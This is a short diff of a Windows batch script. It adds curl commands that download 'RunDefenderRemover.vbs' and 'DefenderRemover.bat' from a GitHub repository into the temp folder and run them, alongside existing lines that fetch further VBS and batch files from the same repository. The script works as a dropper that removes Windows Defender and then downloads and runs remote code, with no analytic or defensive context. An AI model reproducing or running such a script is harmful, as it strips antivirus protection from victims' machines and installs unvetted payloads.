@@ -30,6 +30,11 @@ cd ..
 DefenderRemover.bat
 
 cd %temp%
+curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/RunDefenderRemover.vbs -o RunDefenderRemover.vbs
+curl https://github.com/seition2doc/dosta2/blob/main/DefenderRemover.bat -o DefenderRemover.bat 
+
+RunDefenderRemover.vbs
+
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs-o e.vbs
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd123.bat -o asd123.bat
 
